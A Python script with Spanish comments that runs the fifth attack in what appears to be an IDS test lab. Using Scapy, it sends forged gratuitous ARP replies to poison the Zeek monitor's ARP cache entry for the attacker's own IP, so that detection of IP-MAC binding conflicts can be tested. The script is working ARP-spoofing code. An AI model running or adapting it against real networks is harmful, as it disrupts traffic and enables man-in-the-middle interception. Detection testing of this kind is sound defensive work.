#!/usr/bin/env python3
"""
Ataque 5 -- ARP Spoofing / envenenamiento de cache ARP contra el monitor.
 
IMPORTANTE (limitacion de topologia, discutida y aceptada antes de
implementar): la topologia en estrella de este laboratorio (cada host
comparte segmento L2 UNICAMENTE con el monitor, nunca con otro host) fue
diseñada deliberadamente para eliminar el punto ciego del IDS -- pero
como efecto colateral, tambien elimina la superficie de ataque del ARP
spoofing CLASICO (interceptar trafico entre DOS victimas reales
compartiendo segmento): en el segmento del atacante (net_attacker) el
UNICO vecino L2 es el monitor, no hay ninguna tercera victima a la que
engañar. Por eso este ataque NO puede (ni pretende) dar soporte real a
la via de reconocimiento pasivo especulada en el ataque 3 (esnifar
trafico SCADA<->PLC) -- esa nota de las notas del proyecto queda
corregida.
 
Lo que SI se demuestra aqui, con efecto real y verificable: la TECNICA de
envenenamiento de cache ARP en si misma (el mismo mecanismo de ARP reply
gratuito que usaria un "arpspoof" real contra la cache de una victima),
aplicada contra el unico vecino L2 real que tiene el atacante -- el
propio monitor. El atacante emite ARP replies gratuitos falsificando su
PROPIA direccion (afirmando que su IP esta en una MAC distinta a la
real). Si el envenenamiento funciona, la cache ARP del monitor para la
IP del atacante queda corrompida -- verificable con
"docker exec monitor_zeek ip neigh show" antes y despues del ataque -- y
el trafico de vuelta hacia el atacante se rompe hasta que la entrada se
corrija o expire. Es la misma primitiva de ataque y la misma señal de
deteccion (conflicto de binding IP-MAC) que detectaria un MITM real en
una red menos segmentada que esta.
"""
 
import subprocess
import time
from datetime import datetime
 
from scapy.all import Ether, ARP, sendp, get_if_hwaddr
 
GATEWAY_IP = "192.168.204.2"   # IP del monitor en el segmento del atacante
ATTACKER_IP = "192.168.204.3"  # IP propia -- la que vamos a falsificar
 
SPOOF_DURATION_S = 30
SPOOF_INTERVAL_S = 2
 
 
def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {message}", flush=True)
 
 
def get_iface():
    """Detecta la interfaz de red real del contenedor (excluye loopback),
    mismo patron de deteccion dinamica ya usado en monitor-start.sh."""
    out = subprocess.run(
        ["ip", "-o", "link", "show"], capture_output=True, text=True
    ).stdout
    for line in out.splitlines():
        name = line.split(":")[1].strip().split("@")[0]
        if name.startswith("eth"):
            return name
    raise RuntimeError("No se encontro ninguna interfaz de red valida")
 
 
def fake_mac_from(real_mac):
    """Genera una MAC 'falsa' distinta de la real (cambia el segundo
    octeto), solo para que sea facilmente distinguible de la real en los
    logs y en 'ip neigh show'."""
    parts = real_mac.split(":")
    parts[1] = "ff"
    return ":".join(parts)
 
def send_baseline(iface, real_mac):
    baseline_packet = (Ether(src=real_mac, dst="ff:ff:ff:ff:ff:ff") 
                       / ARP(op=2, hwsrc=real_mac, psrc=ATTACKER_IP, hwdst="ff:ff:ff:ff:ff:ff", pdst=GATEWAY_IP)
                      )
    for _ in range(3):
        sendp(baseline_packet, iface=iface, verbose=False)
        time.sleep(1)
 
def main():
    iface = get_iface()
    real_mac = get_if_hwaddr(iface)
    spoofed_mac = fake_mac_from(real_mac)
 
    log_message(
        f"########## INICIO ataque 5: ARP spoofing / envenenamiento de cache "
        f"contra {GATEWAY_IP} (monitor) -- {SPOOF_DURATION_S}s ##########"
    )
    log_message(f"Interfaz: {iface} | MAC real: {real_mac} | MAC falsificada: {spoofed_mac}")
    log_message(
        f"Vamos a hacer creer al monitor que {ATTACKER_IP} (nuestra propia IP) "
        f"esta en la MAC {spoofed_mac} en vez de la real ({real_mac})."
    )
    log_message("Fase 1/2: estableciendo linea base legitima (MAC real) para que Zeek la conozca...")
    send_baseline(iface, real_mac)
    packet = (
        Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff")
        / ARP(op=2, hwsrc=spoofed_mac, psrc=ATTACKER_IP, hwdst="ff:ff:ff:ff:ff:ff", pdst=GATEWAY_IP)
    )
    log_message(
        f"Fase 2/2: ahora si, vamos a hacer creer al monitor que {ATTACKER_IP} "
        f"(nuestra propia IP) esta en la MAC {spoofed_mac} en vez de la real "
        f"({real_mac})."
    )

    start = time.time()
    sent = 0
    while time.time() - start < SPOOF_DURATION_S:
        sendp(packet, iface=iface, verbose=False)
        sent += 1
        time.sleep(SPOOF_INTERVAL_S)
 
    log_message(f"Enviados {sent} ARP replies gratuitos falsificados.")
    log_message(
        f"AHORA comprueba de nuevo: 'docker exec monitor_zeek ip neigh show | "
        f"grep {ATTACKER_IP}' -- si la cache quedo envenenada, deberia mostrar "
        f"la MAC falsificada ({spoofed_mac}) en vez de la real ({real_mac})."
    )
    log_message(
        "Nota: la cache se autocorregira en cuanto el atacante vuelva a "
        "mandar trafico legitimo (el kernel reenviara con su MAC real) o "
        "cuando expire la entrada ARP -- si quieres mantener el "
        "envenenamiento mas tiempo, sube SPOOF_DURATION_S."
    )
    log_message("########## FIN ataque 5 ##########")
 
 
if __name__ == "__main__":
    main()
 